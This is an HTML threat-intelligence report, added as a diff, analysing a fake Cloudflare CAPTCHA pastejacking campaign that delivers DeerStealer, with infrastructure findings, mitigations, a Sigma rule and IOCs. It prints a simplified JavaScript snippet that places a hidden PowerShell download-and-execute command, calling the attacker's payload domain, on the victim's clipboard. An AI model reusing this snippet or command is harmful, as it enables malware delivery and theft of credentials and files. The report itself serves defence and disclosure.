@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>The CAPTCHA Deception: 
+Dissecting a Sophisticated Pastejacking Campaign, from individual phishing to International Crackdown</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Inter:wght@300;400;500;600;700&display=swap');
+  
+  :root {
+    --primary-red: #dc2626;
+    --dark-bg: #0f172a;
+    --card-bg: #1e293b;
+    --text-primary: #f1f5f9;
+    --text-secondary: #94a3b8;
+    --accent-blue: #3b82f6;
+    --warning-orange: #f59e0b;
+    --success-green: #10b981;
+    --border-color: #334155;
+  }
+  
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(135deg, var(--dark-bg) 0%, #1e293b 100%);
+    color: var(--text-primary);
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+  
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 2rem;
+  }
+  
+  .header {
+    text-align: center;
+    margin-bottom: 3rem;
+    padding: 2rem 0;
+    background: linear-gradient(135deg, var(--primary-red) 0%, #991b1b 100%);
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(220, 38, 38, 0.3);
+  }
+  
+  .header h1 {
+    font-size: 2.5rem;
+    font-weight: 700;
+    margin-bottom: 0.5rem;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+  }
+  
+  .header .subtitle {
+    font-size: 1.1rem;
+    color: #fecaca;
+    font-weight: 300;
+  }
+  
+  .meta-info {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-top: 1rem;
+    flex-wrap: wrap;
+  }
+  
+  .meta-tag {
+    background: rgba(255,255,255,0.1);
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    font-size: 0.9rem;
+    backdrop-filter: blur(10px);
+  }
+  
+  .section {
+    background: var(--card-bg);
+    margin-bottom: 2rem;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    border: 1px solid var(--border-color);
+  }
+  
+  .section-header {
+    background: linear-gradient(135deg, var(--accent-blue) 0%, #1d4ed8 100%);
+    padding: 1.5rem;
+    position: relative;
+    overflow: hidden;
+  }
+  
+  .section-header::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+    opacity: 0.3;
+  }
+  
+  .section-header h2 {
+    font-size: 1.5rem;
+    font-weight: 600;
+    position: relative;
+    z-index: 1;
+  }
+  
+  .section-header .step-number {
+    font-size: 0.9rem;
+    opacity: 0.8;
+    font-weight: 300;
+  }
+  
+  .section-content {
+    padding: 2rem;
+  }
+  
+  .signature-block {
+  margin-top: 40px;
+  padding-top: 20px;
+  border-top: 1px solid #ccc;
+  font-size: 1em;
+  color: #888;
+  text-align: left;
+  }
+  
+  .signature-block strong {
+  color: #333;
+  font-size: 1.1em;
+  }
+
+  .threat-level {
+    display: inline-block;
+    padding: 0.5rem 1rem;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 0.9rem;
+    margin-bottom: 1rem;
+  }
+  
+  .threat-critical {
+    background: linear-gradient(135deg, var(--primary-red) 0%, #991b1b 100%);
+    color: white;
+  }
+  
+  .threat-high {
+    background: linear-gradient(135deg, var(--warning-orange) 0%, #d97706 100%);
+    color: white;
+  }
+  
+  .code-block {
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    overflow-x: auto;
+    position: relative;
+  }
+  
+  .code-block::before {
+    content: attr(data-lang);
+    position: absolute;
+    top: 0.5rem;
+    right: 0.5rem;
+    font-size: 0.8rem;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+  }
+  
+  .highlight {
+    background: linear-gradient(135deg, var(--warning-orange) 0%, #d97706 100%);
+    color: white;
+    padding: 0.2rem 0.5rem;
+    border-radius: 4px;
+    font-weight: 600;
+  }
+  
+  .ioc-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  
+  .ioc-card {
+    background: rgba(59, 130, 246, 0.1);
+    border: 1px solid var(--accent-blue);
+    border-radius: 8px;
+    padding: 1rem;
+  }
+  
+  .ioc-card h4 {
+    color: var(--accent-blue);
+    margin-bottom: 0.5rem;
+    font-size: 0.9rem;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  
+  .ioc-card code {
+    background: rgba(15, 23, 42, 0.8);
+    padding: 0.3rem 0.6rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+  }
+  
+  .image-container {
+    margin: 2rem 0;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  }
+  
+  .image-container img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+  
+  .image-caption {
+    background: rgba(15, 23, 42, 0.9);
+    padding: 1rem;
+    font-size: 0.9rem;
+    color: var(--text-secondary);
+    border-top: 1px solid var(--border-color);
+  }
+  
+  .attack-flow {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+    margin: 2rem 0;
+    padding: 1.5rem;
+    background: linear-gradient(135deg, rgba(220, 38, 38, 0.1) 0%, rgba(153, 27, 27, 0.1) 100%);
+    border-radius: 8px;
+    border: 1px solid rgba(220, 38, 38, 0.3);
+  }
+  
+  .attack-step {
+    background: var(--card-bg);
+    padding: 1rem;
+    border-radius: 8px;
+    text-align: center;
+    flex: 1;
+    min-width: 150px;
+    border: 1px solid var(--border-color);
+  }
+  
+  .attack-step::after {
+    content: '→';
+    position: absolute;
+    right: -15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--primary-red);
+    font-size: 1.5rem;
+    font-weight: bold;
+  }
+  
+  .attack-step:last-child::after {
+    display: none;
+  }
+  
+  .attack-step {
+    position: relative;
+  }
+  
+  .key-findings {
+    background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(5, 150, 105, 0.1) 100%);
+    border: 1px solid var(--success-green);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 2rem 0;
+  }
+  
+  .key-findings h3 {
+    color: var(--success-green);
+    margin-bottom: 1rem;
+    font-size: 1.2rem;
+  }
+  
+  .findings-list {
+    list-style: none;
+    padding: 0;
+  }
+  
+  .findings-list li {
+    padding: 0.5rem 0;
+    padding-left: 1.5rem;
+    position: relative;
+  }
+  
+  .findings-list li::before {
+    content: '✓';
+    position: absolute;
+    left: 0;
+    color: var(--success-green);
+    font-weight: bold;
+  }
+  
+  .mitigation-box {
+    background: linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(29, 78, 216, 0.1) 100%);
+    border: 1px solid var(--accent-blue);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 2rem 0;
+  }
+  
+  .mitigation-box h3 {
+    color: var(--accent-blue);
+    margin-bottom: 1rem;
+    font-size: 1.2rem;
+  }
+  
+  .author-note {
+    background: rgba(148, 163, 184, 0.1);
+    border-left: 4px solid var(--text-secondary);
+    padding: 1rem 1.5rem;
+    margin: 2rem 0;
+    font-style: italic;
+    border-radius: 0 8px 8px 0;
+  }
+  
+  @media (max-width: 768px) {
+    .container {
+      padding: 1rem;
+    }
+    
+    .header h1 {
+      font-size: 2rem;
+    }
+    
+    .meta-info {
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .attack-flow {
+      flex-direction: column;
+    }
+    
+    .attack-step::after {
+      content: '↓';
+      right: 50%;
+      transform: translateX(50%);
+      top: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <h1>The CAPTCHA Deception</h1>
+    <p class="subtitle"style="color: yellow; font-weight: bold;">Dissecting a Sophisticated Pastejacking Campaign, from individual Phishing to International Crackdown</p>
+    <p class="subtitle ;">Advanced Campaign Analysis & Threat Intelligence</p>
+    <div class="meta-info">
+      <div class="meta-tag">🔍 Threat Research</div>
+      <div class="meta-tag">⚡ Active Campaign</div>
+      <div class="meta-tag">🎯 Social Engineering</div>
+      <div class="meta-tag">💻 Malware Analysis</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Executive Summary</p>
+      <h2>Campaign Overview</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-critical">THREAT LEVEL: CRITICAL</div>
+      
+      <p>During threat hunting activities, I have identified a sophisticated phishing campaign leveraging fake Cloudflare CAPTCHA pages to deploy <span class="highlight">DeerStealer</span> malware through pastejacking techniques. The attack chain demonstrates advanced social engineering tactics combined with legitimate-looking UI elements to trick users into executing malicious PowerShell commands.</p>
+      
+      <p>This campaign represents a significant evolution in phishing tactics, moving beyond traditional credential harvesting to direct system compromise through clipboard manipulation. The threat actors demonstrate operational sophistication through their use of bulletproof hosting infrastructure and multi-stage payload delivery.</p>
+      
+      <div class="author-note">
+        <strong>Researcher Note:</strong> Initial discovery credited to <a href="https://www.linkedin.com/in/christoph-jans/" target="_blank" style="color: var(--accent-blue);">Chris Jans</a> who first flagged this campaign in his LinkedIn post <a href="https://www.linkedin.com/posts/christoph-jans_warning-check-your-next-captcha-before-activity-7343686915943985152-bxyE?utm_source=share&utm_medium=member_desktop&rcm=ACoAAAKW4icBEqzeUoO1eGObKlAW6kHJPUmJiic" target="_blank" style="color: var(--accent-blue);">Warning! Check your next Captcha before you do what they ask!!</a> raising community awareness to the matter. This research, investigation and analysis expands on the technical implementation and infrastructure mapping.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Phase 1</p>
+      <h2>Initial Vector: Weaponized CAPTCHA Interface</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-high">SOCIAL ENGINEERING</div>
+      
+      <p>The attack begins with victims being redirected to a convincing Cloudflare CAPTCHA page hosted on the compromised domain <code>accarda.com</code>. The visual design closely mimics legitimate Cloudflare verification pages, exploiting user trust in this widely-recognized security mechanism.</p>
+      
+      <div class="image-container">
+        <img src="CloudFlare_CAPTCHA.png" alt="Fake Cloudflare CAPTCHA interface">
+        <div class="image-caption">
+          <strong>Figure 1:</strong> Initial phishing lure - fake Cloudflare CAPTCHA page designed to establish trust
+        </div>
+      </div>
+      
+      <p>Upon checkbox interaction, the page dynamically reveals additional "verification" steps instead of navigating away. This technique is psychologically effective because:</p>
+      
+      <ul class="findings-list">
+        <li>Users expect multi-step verification processes</li>
+        <li>The interface maintains visual consistency with legitimate services</li>
+        <li>Instructions appear to be security-related rather than malicious</li>
+        <li>The Win+R shortcut is presented as a "system verification" step</li>
+      </ul>
+      
+      <div class="image-container">
+        <img src="CloudFlare_CAPTCHA_Instructions-when-clicked.png" alt="Malicious instructions after CAPTCHA click">
+        <div class="image-caption">
+          <strong>Figure 2:</strong> Post-click instructions guiding users to execute clipboard content via Win+R
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Phase 2</p>
+      <h2>Pastejacking Implementation</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-critical">CLIPBOARD HIJACKING</div>
+      
+      <p>The core attack mechanism relies on JavaScript-based clipboard manipulation. When users interact with the fake CAPTCHA, malicious code silently copies a PowerShell command to their clipboard, priming the pastejacking attack.</p>
+      
+      <div class="image-container">
+        <img src="accarda.com_source_code.png" alt="Obfuscated source code">
+        <div class="image-caption">
+          <strong>Figure 3:</strong> Obfuscated JavaScript code responsible for clipboard manipulation
+        </div>
+      </div>
+      
+      <p>Deobfuscation reveals the clipboard injection mechanism:</p>
+      
+      <div class="code-block" data-lang="javascript">
+// Simplified pastejacking payload
+function injectClipboard() {
+    const payload = 'powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'https://alababababa.cloud/cVGvQio6.txt\')"';
+    navigator.clipboard.writeText(payload);
+}
+      </div>
+      
+      <div class="image-container">
+        <img src="pastejacking_onclick_code.png" alt="Deobfuscated clipboard injection code">
+        <div class="image-caption">
+          <strong>Figure 4:</strong> Deobfuscated JavaScript showing clipboard injection on user interaction
+        </div>
+      </div>
+      
+      <p>Interestingly, the source code contains Russian-language comments, suggesting either:</p>
+      <ul class="findings-list">
+        <li>Russian-speaking threat actors</li>
+        <li>Reuse of existing Russian malware frameworks</li>
+        <li>Deliberate false flag operations</li>
+      </ul>
+      
+      <div class="image-container">
+        <img src="rus_instructions_in_code.png" alt="Russian comments in source code">
+        <div class="image-caption">
+          <strong>Figure 5:</strong> Russian-language comments embedded in the malicious code
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Phase 3</p>
+      <h2>Command & Control Infrastructure</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-high">C2 COMMUNICATION</div>
+      
+      <p>The injected PowerShell command establishes communication with the second-stage payload server at <code>alababababa.cloud</code>. Infrastructure analysis reveals concerning connections to sanctioned bulletproof hosting providers.</p>
+      
+      <div class="ioc-grid">
+        <div class="ioc-card">
+          <h4>Primary C2 Domain</h4>
+          <code>alababababa.cloud</code>
+        </div>
+        <div class="ioc-card">
+          <h4>IP Address</h4>
+          <code>77.110.118.195</code>
+        </div>
+        <div class="ioc-card">
+          <h4>Hosting Provider</h4>
+          <code>AEZA INTERNATIONAL LTD</code>
+        </div>
+        <div class="ioc-card">
+          <h4>Infrastructure</h4>
+          <code>quaintlove.aeza.network</code>
+        </div>
+      </div>
+      
+      <div class="image-container">
+        <img src="shodan_alababababa.cloud-77.110.118.195.jpg" alt="Shodan reconnaissance results">
+        <div class="image-caption">
+          <strong>Figure 6:</strong> Shodan intelligence revealing infrastructure connections to sanctioned hosting provider
+        </div>
+      </div>
+      
+      <div class="key-findings">
+        <h3>🚨 Critical Infrastructure Intelligence</h3>
+        <p><strong>AEZA GROUP</strong> a Russia-based bulletproof hosting (BPH) provider, was sanctioned by OFAC and the UK's National Crime Agency (NCA) on July 1, 2025, for providing bulletproof hosting services (BPH), for facilitating a wide range of cybercriminal activities worldwide. Aeza Group’s U.K. front company, Aeza International Ltd., and its Russian subsidiaries, Aeza Logistic LLC and Cloud Solutions LLC, all of which are accused of leasing IP addresses and infrastructure to cybercriminals. Coordibnated joint move also targets Aeza’s network of affiliated companies and four senior executives, underscoring a transatlantic effort to disrupt the infrastructure underpinning ransomware, data theft, and illicit online drug markets.
+<p><strong>Bulletproof Hosting (BPH)</strong> is a specialized internet infrastructure service that provides cybercriminals with resilient servers and network resources designed to evade law enforcement and ignore abuse complaints. 
+This infrastructure has been consistently linked to:</p>
+        <ul class="findings-list">
+          <li>Ransomware operations</li>
+          <li>Large-scale phishing campaigns</li>
+          <li>Infostealer malware distribution (Lumma, Meduza)</li>
+          <li>Data exfiltration services</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Phase 4</p>
+      <h2>Payload Analysis & System Compromise</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-critical">MALWARE EXECUTION</div>
+      
+      <p>The PowerShell command retrieves and executes a base64-encoded payload from <code>cVGvQio6.txt</code>. Dynamic analysis reveals a multi-component malware package designed for comprehensive system compromise.</p>
+      
+      <div class="attack-flow">
+        <div class="attack-step">
+          <strong>Stage 1</strong><br>
+          PowerShell Dropper
+        </div>
+        <div class="attack-step">
+          <strong>Stage 2</strong><br>
+          Payload Retrieval
+        </div>
+        <div class="attack-step">
+          <strong>Stage 3</strong><br>
+          Component Unpacking
+        </div>
+        <div class="attack-step">
+          <strong>Stage 4</strong><br>
+          System Infection
+        </div>
+      </div>
+      
+      <h3>Dropped Components Analysis</h3>
+      
+      <div class="code-block" data-lang="filesystem">
+%AppData%\
+├── Windpoolruol.rw          # Encrypted configuration
+├── Register.dll             # Persistence mechanism  
+├── EngineX-Aurora.exe       # Main payload orchestrator
+└── RaScope.exe             # Data exfiltration module
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 171200.jpg" alt="PowerShell execution analysis">
+        <div class="image-caption">
+          <strong>Figure 7:</strong> PowerShell execution chain showing payload retrieval and component deployment
+        </div>
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 171327.jpg" alt="Aurora executable behavior">
+        <div class="image-caption">
+          <strong>Figure 8:</strong> EngineX-Aurora.exe behavioral analysis showing system reconnaissance activities
+        </div>
+      </div>
+      
+      <h3>System Enumeration Activities</h3>
+      
+      <p>The malware performs extensive system reconnaissance, accessing registry keys including:</p>
+      
+      <div class="code-block" data-lang="registry">
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ActiveComputerName
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Sorting\Versions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 171436.jpg" alt="RaScope malicious behavior">
+        <div class="image-caption">
+          <strong>Figure 9:</strong> RaScope.exe conducting credential harvesting and system data collection
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Phase 5</p>
+      <h2>Data Exfiltration & Attribution</h2>
+    </div>
+    <div class="section-content">
+      <div class="threat-level threat-critical">DATA THEFT</div>
+      
+      <p>Network analysis reveals data exfiltration to <code>anodes.pro</code> via base64-encoded POST requests. IDS signatures confirm this as <span class="highlight">DeerStealer</span> malware activity.</p>
+      
+      <div class="image-container">
+        <img src="2025-07-10_whois_anodes.pro_registrant.png" alt="anades.pro ICANN registrant information" style="width: 50%; height: auto; display: block; margin: 0 auto;">
+        <div class="image-caption">
+          <strong>Figure 10:</strong> anades.pro ICANN sketchy registrant information
+        </div>
+      </div>
+
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 191307.jpg" alt="DeerStealer detection">
+        <div class="image-caption">
+          <strong>Figure 11:</strong> IDS alert confirming DeerStealer malware family identification
+        </div>
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 191345.jpg" alt="Network connections table">
+        <div class="image-caption">
+          <strong>Figure 12:</strong> Network connections showing data exfiltration to command and control servers
+        </div>
+      </div>
+      
+      <h3>Exfiltrated Data Types</h3>
+      
+      <div class="ioc-grid">
+        <div class="ioc-card">
+          <h4>Credentials</h4>
+          <code>Chrome saved passwords<br>Browser cookies<br>Session tokens</code>
+        </div>
+        <div class="ioc-card">
+          <h4>System Info</h4>
+          <code>OS version<br>Installed software<br>Hardware details</code>
+        </div>
+        <div class="ioc-card">
+          <h4>Files</h4>
+          <code>Documents<br>Cryptocurrency wallets<br>SSH keys</code>
+        </div>
+        <div class="ioc-card">
+          <h4>Remote Access</h4>
+          <code>UltraVNC installation<br>Persistent backdoor<br>Screen capture</code>
+        </div>
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 191457.jpg" alt="Network traffic analysis">
+        <div class="image-caption">
+          <strong>Figure 13:</strong> Captured network stream showing base64-encoded data exfiltration
+        </div>
+      </div>
+      
+      <div class="image-container">
+        <img src="Screenshot 2025-06-25 192411.jpg" alt="Persistent backdoor analysis">
+        <div class="image-caption">
+          <strong>Figure 15:</strong> Additional payload (build.exe) implementing persistent backdoor functionality
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">Intelligence</p>
+      <h2>Threat Assessment & Mitigations</h2>
+    </div>
+    <div class="section-content">
+      <div class="key-findings">
+        <h3>🔍 Key Intelligence Findings</h3>
+        <ul class="findings-list">
+          <li>Campaign leverages trusted Cloudflare branding for initial credibility</li>
+          <li>Pastejacking technique bypasses many traditional security controls</li>
+          <li>Multi-stage payload delivery complicates detection and analysis</li>
+          <li>Infrastructure connections to sanctioned bulletproof hosting providers</li>
+          <li>DeerStealer deployment indicates organized cybercriminal operation</li>
+          <li>UltraVNC component suggests long-term persistent access objectives</li>
+        </ul>
+      </div>
+      
+      <div class="mitigation-box">
+        <h3>🛡️ Defensive Recommendations</h3>
+        
+        <h4>Technical Controls</h4>
+        <ul class="findings-list">
+          <li>Implement PowerShell execution logging and monitoring</li>
+          <li>Deploy clipboard monitoring solutions for suspicious activity</li>
+          <li>Block network communications to identified IOCs</li>
+          <li>Enable Windows Defender Application Guard for browsers</li>
+          <li>Implement DNS filtering to block malicious domains</li>
+        </ul>
+        
+        <h4>User Education</h4>
+        <ul class="findings-list">
+          <li>Train users to recognize fake CAPTCHA pages</li>
+          <li>Emphasize caution with Win+R keyboard shortcuts</li>
+          <li>Educate on pastejacking attack vectors</li>
+          <li>Promote verification of legitimate CAPTCHA URLs</li>
+        </ul>
+        
+        <h4>Detection Rules</h4>
+        <div class="code-block" data-lang="sigma">
+# Sigma rule for detecting pastejacking PowerShell execution
+title: Suspicious PowerShell Execution via RunDialog
+detection:
+  selection:
+    CommandLine|contains:
+      - 'powershell'
+      - '-WindowStyle Hidden'
+      - 'DownloadString'
+      - 'IEX'
+  condition: selection
+        </div>
+      </div>
+      
+      <div class="author-note">
+        <strong>Attribution Assessment:</strong> While Russian-language artifacts suggest Eastern European threat actors, the use of bulletproof hosting and sophisticated social engineering indicates this is likely a financially-motivated cybercriminal operation rather than state-sponsored activity. The campaign's focus on credential harvesting and system access aligns with typical ransomware affiliate reconnaissance activities.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <p class="step-number">IOCs</p>
+      <h2>Indicators of Compromise</h2>
+    </div>
+    <div class="section-content">
+      <div class="code-block" data-lang="iocs">
+# Domains
+accarda.com
+alababababa.cloud
+anodes.pro
+
+# IPs  
+77.110.118.195
+
+# File Hashes (MD5)
+[Dynamic analysis pending - hashes to be updated]
+
+# File Names
+Windpoolruol.rw
+Register.dll
+EngineX-Aurora.exe
+RaScope.exe
+build.exe
+cVGvQio6.txt
+
+# Registry Keys
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\ComputerName\ActiveComputerName
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Sorting\Versions
+
+# Network Signatures
+DeerStealer malware family
+Base64 encoded POST requests to anodes.pro
+UltraVNC remote access installation
+      </div>
+    </div>
+  </div>
+
+  </div>
+    <div class="signature-block">
+      <p><strong>Andrii Stepovyi</strong>
+      <br>Security Consultant | Cyber Threat Intelligence Researcher | PenTester</p>
+</div>
+
+</body>
+</html>
